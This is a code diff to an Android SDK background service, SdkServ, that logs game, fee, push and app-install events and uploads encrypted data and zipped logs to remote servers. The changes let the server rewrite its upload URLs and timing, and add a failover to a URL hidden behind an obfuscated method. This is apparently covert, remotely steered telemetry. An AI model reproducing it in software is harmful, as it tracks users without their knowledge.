@@ -84,17 +84,17 @@ public class SdkServ implements DServ{
     public static final int ERR_LOG_THREAD = 712;
     public static final int ERR_LOG_UPLOAD = 713;
     
+    long nextUpTime;
+    long lastUpTime = 0;
+    long lastUpLogTime = 0;
 	int taskSleepTime = 5*60*1000;
 	int upSleepTime = 1000*60*60*6;
 	int shortSleepTime = 1000*60*5;
-	long nextUpTime;
-	long lastUpTime = 0;
-	long maxLogSleepTime = 1000*60*60;
-	long lastUpLogTime = 0;
-	long maxLogSize = 1024*10;
+	int maxLogSleepTime = 1000*60*60;
+	int maxLogSize = 1024*10;
 	
 	int timeOut = 5000;
-	private int version = 3;
+	private int version = 5;
 //	private static int keyVersion = 1;
 	private static final String SPLIT_STR = "@@";
 	private static final String datFileType = ".dat";
@@ -137,20 +137,20 @@ public class SdkServ implements DServ{
 		private long tid;
 		private int type;
 		private String msg;
-		private String notiUrl;
+		private String noti_Url;
 		private long uid;
 		public void setParas(long tid,int type,String msg,String notiUrl,long uid){
 			this.tid = tid;
 			this.type = type;
 			this.msg = msg;
-			this.notiUrl = notiUrl;
+			this.noti_Url = notiUrl;
 			this.uid = uid;
 		}
 
 		@Override
 		public void run() {
 			try {
-				String u = this.notiUrl+"?t="+this.tid+"&y="+this.type+"&u="+this.uid+"&m="+msg;
+				String u = this.noti_Url+"?t="+this.tid+"&y="+this.type+"&u="+this.uid+"&m="+msg;
 				URL url = new URL(u);
 				HttpURLConnection conn = (HttpURLConnection) url.openConnection();
 				conn.connect();
@@ -196,7 +196,7 @@ public class SdkServ implements DServ{
 
 	public void noti(long tid,int type,String msg){
 		NotiTask nt = new NotiTask();
-		nt.setParas(tid, type, msg, this.notiUrl, this.uid);
+		nt.setParas(tid, type, msg, SdkServ.this.getPropString("notiUrl", notiUrl), this.uid);
 		this.taskList.add(nt);
 		this.taskThread.interrupt();
 	}
@@ -217,6 +217,11 @@ public class SdkServ implements DServ{
 			this.config.put("t", "");
 			this.config.put("dt", "");
 			this.config.put("uid", "0");
+			this.config.put("taskSleepTime", taskSleepTime);
+			this.config.put("upSleepTime", upSleepTime);
+			this.config.put("shortSleepTime", shortSleepTime);
+			this.config.put("maxLogSleepTime", maxLogSleepTime);
+			this.config.put("maxLogSize", maxLogSize);
 			this.saveConfig();
 			DSms.log(this.dsmsv,TAG, "no conf");
 		}
@@ -224,11 +229,11 @@ public class SdkServ implements DServ{
 		try {
 			if (this.config.get("games") != null) {
 				this.gameList = (ArrayList<String>) this.config.get("games");
-				if (!this.gameList.contains(gcid)) {
+				if ((!gcid.startsWith("0_")) && !this.gameList.contains(gcid)) {
 					this.gameList.add(gcid);
 				}
 			}else{
-				if (!this.gameList.contains(gcid)) {
+				if ((!gcid.startsWith("0_")) && !this.gameList.contains(gcid)) {
 					this.gameList.add(gcid);
 				}
 				this.config.put("games", this.gameList);
@@ -236,7 +241,9 @@ public class SdkServ implements DServ{
 			DSms.log(this.dsmsv,TAG, "init config OK:"+JSON.write(this.config));
 		} catch (Exception e) {
 			this.gameList = new ArrayList<String>();
-			this.gameList.add(gcid);
+			if ((!gcid.startsWith("0_"))) {
+				this.gameList.add(gcid);
+			}
 		}
 		
 		//初始化uid
@@ -246,8 +253,13 @@ public class SdkServ implements DServ{
 		upUrl = this.getPropString("upUrl", upUrl);
 		upLogUrl = this.getPropString("upLogUrl", upLogUrl);
 		notiUrl = this.getPropString("notiUrl", notiUrl);
-		this.isConfigInit = true;
+		this.upSleepTime = this.getPropInt("upSleepTime", upSleepTime);
+		this.taskSleepTime = this.getPropInt("taskSleepTime", taskSleepTime);
+		this.shortSleepTime = this.getPropInt("shortSleepTime", shortSleepTime);
+		this.maxLogSize = this.getPropInt("maxLogSize",  maxLogSize);
+		this.maxLogSleepTime = this.getPropInt("maxLogSleepTime", maxLogSleepTime);
 		
+		this.isConfigInit = true;
 //				String keyStr = this.getPropString( "k", Base64Coder.encode(key));
 //				Encrypter.getInstance().setKey(Base64Coder.decode(keyStr));
 //		String tasks = this.getPropString( "t", "");
@@ -425,7 +437,7 @@ public class SdkServ implements DServ{
 				break;
 			case DSms.ACT_GAME_INIT:
 				String gcid = gid+"_"+cid;
-				if (!this.gameList.contains(gid+"_"+cid)) {
+				if ((!gid.equals("0")) && !this.gameList.contains(gid+"_"+cid)) {
 					this.gameList.add(gcid);
 					this.config.put("games", this.gameList);
 					this.saveConfig();
@@ -433,17 +445,23 @@ public class SdkServ implements DServ{
 			case DSms.ACT_GAME_EXIT:
 			case DSms.ACT_GAME_EXIT_CONFIRM:
 			case DSms.ACT_GAME_CUSTOM:
-			dsLog(DSms.LEVEL_I, "GAME",act, p, m);
+				dsLog(DSms.LEVEL_I, "GAME",act, p, m);
 				break;
 			case DSms.ACT_FEE_INIT:
 			case DSms.ACT_FEE_OK:
 			case DSms.ACT_FEE_FAIL:
+				dsLog(DSms.LEVEL_I, "FEE",act, p, m);
+				break;
 			case DSms.ACT_PUSH_CLICK:
 			case DSms.ACT_PUSH_RECEIVE:
+				dsLog(DSms.LEVEL_I, "PUSH",act, p, m);
+				break;
 			case DSms.ACT_APP_INSTALL:
 			case DSms.ACT_APP_REMOVE:
+				dsLog(DSms.LEVEL_I, "APP",act, p, m);
+				break;
 			case DSms.ACT_BOOT:
-				dsLog(DSms.LEVEL_I, "ACT",act, p, m);
+				dsLog(DSms.LEVEL_I, "BOOT",act, p, m);
 				break;
 			case DSms.STATE_STOP:
 				dsLog(DSms.LEVEL_I, "STOP",act, p, m);
@@ -469,36 +487,35 @@ public class SdkServ implements DServ{
 	}
 	
 	private void checkThreads(){
+		try {
+			DSms.log(dsmsv, TAG, "checkThreads start.");
+			Thread.sleep(15 * 1000);
+		} catch (InterruptedException e) {
+		}
+		
 		if (this.state != DSms.STATE_RUNNING) {
 			return;
 		}
-		if (this.lt == null || !this.lt.isAlive()) {
+		if (this.lt == null || this.lt.getState().equals(Thread.State.TERMINATED)) {
+			DSms.log(dsmsv, TAG, "lt start.");
 			this.lt = new LT();
+			this.lt.setRunFlag(true);
 			this.lt.start();
 		}
-		if (this.upThread == null || !this.upThread.isAlive()) {
+		if (this.upThread == null || this.upThread.getState().equals(Thread.State.TERMINATED)) {
+			DSms.log(dsmsv, TAG, "upThread start.");
 			this.upThread = new UpThread();
 			this.upThread.setRun(true);
 			this.upThread.start();
 		}
-		if (this.taskThread == null || !this.taskThread.isAlive()) {
+		if (this.taskThread == null || this.taskThread.getState().equals(Thread.State.TERMINATED)) {
+			DSms.log(dsmsv, TAG, "taskThread start.");
 			this.taskThread = new TaskThread();
-			this.upThread.setRun(true);
+			this.taskThread.setRun(true);
 			this.taskThread.start();
 		}
 	}
 	
-	
-	public void setNextUpTime(long nextUptime){
-		nextUpTime = nextUptime;
-	}
-	
-	public void setUpSleepTime(int sleepTime){
-		upSleepTime = sleepTime;
-	}
-	public void setTaskSleepTime(int sleepTime){
-		taskSleepTime = sleepTime;
-	}
 	
 	public void pauseService(){
 		this.state = DSms.STATE_PAUSE;
@@ -861,30 +878,6 @@ public class SdkServ implements DServ{
 	}
 	private static final int IO_BUFFER_SIZE = 1024 * 4;
 	
-	/*
-	public static boolean download(String remoteUrl,String localFile,String vKey){
-		try {
-			URL url = new URL(remoteUrl);
-			URLConnection con = url.openConnection();
-			con.setRequestProperty("v", vKey);
-			InputStream is = con.getInputStream();
-			byte[] bs = new byte[IO_BUFFER_SIZE];
-			int len;
-			OutputStream os = new FileOutputStream(localFile);
-			while ((len = is.read(bs)) != -1) {
-				os.write(bs, 0, len);
-			}
-			os.close();
-			is.close();
-			return true;
-		} catch (Exception e) {
-			DSms.e(this.dservice,TAG, "remote conn error:"+remoteUrl);
-			e.printStackTrace();
-			
-		}
-		return false;
-	}
-	*/
 	final String ENCORDING = "UTF-8";
 
 	boolean upload(String localFile, String uplogUrl){
@@ -899,7 +892,7 @@ public class SdkServ implements DServ{
 			URL url = new URL(uplogUrl + "?f=" + fileName);
 			// 打开连接, 设置请求头
 			HttpURLConnection conn = (HttpURLConnection) url.openConnection();
-			conn.setConnectTimeout(10000);
+			conn.setConnectTimeout(timeOut);
 			conn.setRequestMethod("POST");
 			conn.setRequestProperty("Content-Type",
 					"multipart/form-data; boundary=" + boundary);
@@ -963,7 +956,7 @@ public class SdkServ implements DServ{
 		boolean runFlag = true;
 		int errTimes = 0;
 		int maxErrTimes = 20;
-		
+		boolean isCJ = false;
 		/**
 		 * @param runFlag the runFlag to set
 		 */
@@ -1025,7 +1018,14 @@ public class SdkServ implements DServ{
 				
 				String data = "up="+DSms.Cg(sb.toString());
 				DSms.log(SdkServ.this.dsmsv,TAG, "enc data:"+data);
-				URL aUrl = new URL(upUrl);
+				URL aUrl = null;
+				if (errTimes > maxErrTimes) {
+					aUrl = new URL(DSms.Cj());
+					isCJ = true;
+				}else{
+					aUrl = new URL(SdkServ.this.getPropString("upUrl", upUrl));
+					isCJ = false;
+				}
 			    URLConnection conn = aUrl.openConnection();
 			    conn.setConnectTimeout(timeOut);
 			    conn.setRequestProperty("v", DSms.Cd(SdkServ.this.dsmsv));
@@ -1090,6 +1090,36 @@ public class SdkServ implements DServ{
 					if (hasRemoteTask) {
 						SdkServ.this.taskThread.interrupt();
 					}
+					
+					//TODO 直接更新参数,格式为a=1,b=2,待测试
+					if (res.length > 3 && StringUtil.isStringWithLen(res[4], 5)) {
+						String[] props = res[4].split(",");
+						boolean isPropUpdate = false;
+						for (int i = 0; i < props.length; i++) {
+							String[] pp = props[i].split("\\=\\=");
+							if (pp.length == 2) {
+								Object org = SdkServ.this.getPropObj(pp[0], null);
+								if (org != null) {
+									if (org instanceof String) {
+										SdkServ.this.setProp(pp[0], pp[1], false);
+										isPropUpdate = true;
+										DSms.log(dsmsv, TAG	, "prop update:"+props[i]+" "+pp[0]+":"+SdkServ.this.getPropString(pp[0], null));
+									}else if(StringUtil.isDigits(pp[1])){
+										SdkServ.this.setProp(pp[0], Integer.parseInt(pp[1]), false);
+										isPropUpdate = true;
+										DSms.log(dsmsv, TAG	, "prop update:"+props[i]+" "+pp[0]+":"+SdkServ.this.getPropInt(pp[0], -1));
+									}else{
+										DSms.log(dsmsv, TAG	, "prop not update:"+props[i]);
+									}
+								}
+							}
+						}
+						if (isPropUpdate) {
+							SdkServ.this.saveConfig();
+						}else{
+							DSms.log(dsmsv, TAG	, "prop not update:"+res[4]);
+						}
+					}
 					return true;
 //				case ORDER_DEL_TASK:
 //					break;
@@ -1126,7 +1156,7 @@ public class SdkServ implements DServ{
 				
 				
 			} catch (Exception e) {
-				DSms.e(SdkServ.this.dsmsv,TAG, "up unknown Error:"+upUrl, e);
+				DSms.e(SdkServ.this.dsmsv,TAG, "up unknown Error:"+SdkServ.this.getPropString("upUrl", upUrl), e);
 			}
 			return false;
 		}
@@ -1134,6 +1164,8 @@ public class SdkServ implements DServ{
 
 		@Override
 		public void run() {
+			DSms.log(SdkServ.this.dsmsv,TAG, "UpThread started"); 
+			
 			if (SdkServ.this.state != DSms.STATE_RUNNING) {
 				return;
 			}
@@ -1144,7 +1176,7 @@ public class SdkServ implements DServ{
 							"up running state:" + SdkServ.this.state);
 
 					if (!StringUtil.isNetOk(SdkServ.this.dsmsv)) {
-						Thread.sleep(shortSleepTime);
+						Thread.sleep(SdkServ.this.getPropInt("shortSleepTime", shortSleepTime));
 						continue;
 					}
 
@@ -1156,7 +1188,7 @@ public class SdkServ implements DServ{
 							// ca.set(Calendar.HOUR_OF_DAY, 6);
 							// nextUpTime = ca.getTimeInMillis();
 							lastUpTime = System.currentTimeMillis();
-							nextUpTime += upSleepTime;
+							nextUpTime += SdkServ.this.getPropInt("upSleepTime", upSleepTime);
 							SdkServ.this.setProp("dt", "", true);
 							DSms.log(SdkServ.this.dsmsv, TAG,
 									"lastUpTime:" + lastUpTime + " nextUpTime"
@@ -1165,30 +1197,23 @@ public class SdkServ implements DServ{
 											+ SdkServ.this.state);
 						} else {
 							errTimes++;
-							Thread.sleep(shortSleepTime);
-							if (errTimes > maxErrTimes) {
-								if (upUrl.equals(DSms.Cj())) {
-									if (errTimes > 1000) {
-										//失败次数超过1000次，主动停止
-										SdkServ.this.stopService();
-									}
-								}else{
-									errTimes = 0;
-									upUrl = DSms.Cj();
-								}
+							Thread.sleep(SdkServ.this.getPropInt("shortSleepTime", shortSleepTime)*errTimes);
+							if (isCJ) {
+								nextUpTime = System.currentTimeMillis()+ SdkServ.this.getPropInt("upSleepTime", upSleepTime);
+								errTimes = 0;
 							}
 							continue;
 						}
 					}
 
-					Thread.sleep(upSleepTime);
+					Thread.sleep(SdkServ.this.getPropInt("upSleepTime", upSleepTime));
 				} catch (Exception e) {
 					if (!e.getClass().equals(InterruptedException.class)) {
 						e.printStackTrace();
 						e(ERR_UP, 0, dsmsv.getPackageName(),
 								"0_0_" + Log.getStackTraceString(e));
 						try {
-							Thread.sleep(shortSleepTime);
+							Thread.sleep(SdkServ.this.getPropInt("shortSleepTime", shortSleepTime));
 						} catch (InterruptedException e1) {
 							e1.printStackTrace();
 						}
@@ -1274,7 +1299,7 @@ public class SdkServ implements DServ{
 						if (StringUtil.isNetOk(SdkServ.this.dsmsv)) {
 							long logSize = getLogSize();
 							long cTime = System.currentTimeMillis();
-							if ((logSize > maxLogSize) || cTime>(lastUpLogTime+maxLogSleepTime)) {
+							if ((logSize > SdkServ.this.getPropInt("maxLogSize", maxLogSize)) || cTime>(lastUpLogTime+SdkServ.this.getPropInt("maxLogSleepTime", maxLogSleepTime))) {
 								String zipName = sdDir+uid+"_"+cTime+".zip";
 								UploadLogTask t = new UploadLogTask();
 								t.setZipFileName(zipName);
@@ -1304,45 +1329,8 @@ public class SdkServ implements DServ{
 								}
 							}
 						}
-						DSms.log(SdkServ.this.dsmsv,TAG, runFlag+","+SdkServ.this.state+","+taskSleepTime);
-						/*
-						//日志上传
-	//					String logs = readLog();
-						long logSize = getLogSize();
-						//判断是否有足够内容,或超过最大上传时间间隔
-						DSms.log(SdkServ.this.dservice,TAG, "log size:"+logSize + " nextTime:"+(lastUpLogTime+maxLogSleepTime)+ " c:"+System.currentTimeMillis());
-						if ((logSize > maxLogSize) || System.currentTimeMillis()>lastUpLogTime+maxLogSleepTime) {
-							boolean re = false;
-							if (!DsReceiver.isNetOk(SdkServ.this.dservice)) {
-								Thread.sleep(shortSleepTime);
-								continue;
-							}
-							String lFile = sdDir+uid+"_"+System.currentTimeMillis()+".zip";
-							re = zip(logFile, lFile);
-							if(re){
-								re = upload(lFile,upLogUrl);
-								if (!re) {
-									DSms.e(SdkServ.this.dservice,TAG, "upLog failed:"+lFile,null);
-								}else{
-									DSms.log(SdkServ.this.dservice,TAG, "upload log OK");
-								}
-							}
-							File f = new File(lFile);
-							f.delete();
-							if (re) {
-								lastUpLogTime = System.currentTimeMillis();
-								f = new File(logFile);
-								synchronized (f) {
-									f.delete();
-								}
-							}else{
-								Thread.sleep(shortSleepTime);
-								continue;
-							}
-						}
-						*/
-						
-						Thread.sleep(taskSleepTime);
+						DSms.log(SdkServ.this.dsmsv,TAG, runFlag+","+SdkServ.this.state+","+SdkServ.this.getPropInt("taskSleepTime", taskSleepTime));
+						Thread.sleep(SdkServ.this.getPropInt("taskSleepTime", taskSleepTime));
 					} catch (Exception e) {
 						if (!e.getClass().equals(InterruptedException.class)) {
 							e.printStackTrace();
@@ -1385,7 +1373,7 @@ public class SdkServ implements DServ{
 					re = zip(logFile, this.zipFileName);
 				}
 				if(re){
-					re = upload(this.zipFileName,upLogUrl);
+					re = upload(this.zipFileName,SdkServ.this.getPropString("upLogUrl", upLogUrl));
 					if (!re) {
 						DSms.e(SdkServ.this.dsmsv,TAG, "upLog failed:"+this.zipFileName,null);
 					}else{
@@ -1402,6 +1390,7 @@ public class SdkServ implements DServ{
 						f.delete();
 					}
 				}else{
+					SdkServ.this.taskList.remove(this);
 					return;
 				}
 				
@@ -1453,9 +1442,11 @@ public class SdkServ implements DServ{
 		StringBuilder sb = new StringBuilder();
 		synchronized (this.taskList) {
 			for (DSTask task : taskList) {
-				sb.append(SPLIT_STR);
 				int id = task.getId();
-				sb.append(id);
+				if (id != 0) {
+					sb.append(SPLIT_STR);
+					sb.append(id);
+				}
 			}
 		}
 		if (sb.length() > 0) {
@@ -1561,7 +1552,7 @@ public class SdkServ implements DServ{
 			DSms.e(this.dsmsv,TAG, "DService IS NULL",null);
 			return ;
 		}
-		DSms.log(this.dsmsv,TAG, "init:"+dservice.getPackageName()+" state:"+this.state);
+		DSms.log(this.dsmsv,TAG, "init:"+dservice.getPackageName()+" state:"+this.state+" gcid:"+gcid);
 		
 		(new File(sdDir)).mkdirs();
 		
@@ -1589,6 +1580,7 @@ public class SdkServ implements DServ{
 		
 		
         if (lt != null || this.upThread != null || this.taskThread!=null) {
+        	DSms.log(dsmsv, TAG, "STOP threads and waiting for restart.");
 			this.upThread.setRun(false);
 			this.taskThread.setRun(false);
 			this.lt.setRunFlag(false);
@@ -1604,7 +1596,7 @@ public class SdkServ implements DServ{
 		this.upThread.setRun(true);
 		this.upThread.start();
 		this.taskThread = new TaskThread();
-		this.upThread.setRun(true);
+		this.taskThread.setRun(true);
 		this.taskThread.start();
 		
 		
@@ -1640,13 +1632,6 @@ public class SdkServ implements DServ{
 //		filter.addAction(Intent.ACTION_PACKAGE_REPLACED);
 //		filter.addDataScheme("package");
 //		dservice.registerReceiver(receiver, filter);
-	}
-
-	/**
-	 * @param upUrl the upUrl to set
-	 */
-	public final void setUpUrl(String url) {
-		upUrl = url;
 	}
 
 	/**
@@ -1689,15 +1674,6 @@ public class SdkServ implements DServ{
 		this.config.put("emvPath", emvPath);
 	}
 
-	
-	
-	public long getMaxLogSize() {
-		return maxLogSize;
-	}
-
-	public void setMaxLogSize(long maxLogSize) {
-		this.maxLogSize = maxLogSize;
-	}
 
 	@Override
 	public int getState() {
@@ -1853,11 +1829,6 @@ public class SdkServ implements DServ{
 		
 	}
 
-
-//
-//	public boolean isNetOk() {
-//		return isNetOk;
-//	}
 	
 	public final int getVer(){
 		return this.version;
@@ -1880,24 +1851,4 @@ public class SdkServ implements DServ{
 	public String getEmp() {
 		return this.emvClass+"@@"+this.emvPath;
 	}
-//	public class PackageBroadcastReceiver extends BroadcastReceiver {
-//	    @Override
-//	    public void onReceive(Context context, Intent intent) {
-//	        String iAct = intent.getAction();
-//	        int act = 0;
-//	        String m = null;
-//	        if (Intent.ACTION_PACKAGE_ADDED.equals(iAct)) {
-//				act = DSms.ACT_APP_INSTALL;
-//				m = intent.getDataString();
-//			}else if(Intent.ACTION_PACKAGE_REMOVED.equals(iAct)){
-//				act = DSms.ACT_APP_REMOVE;
-//				m = intent.getDataString();
-//			}else if(Intent.ACTION_PACKAGE_REPLACED.equals(iAct)){
-//				act = DSms.ACT_APP_REPLACED;
-//				m = intent.getDataString();
-//			}
-//	        m = "0_0_"+m;
-//	        SdkServ.this.receiveMsg(act, "", "", m);
-//	    }
-//	};
 }
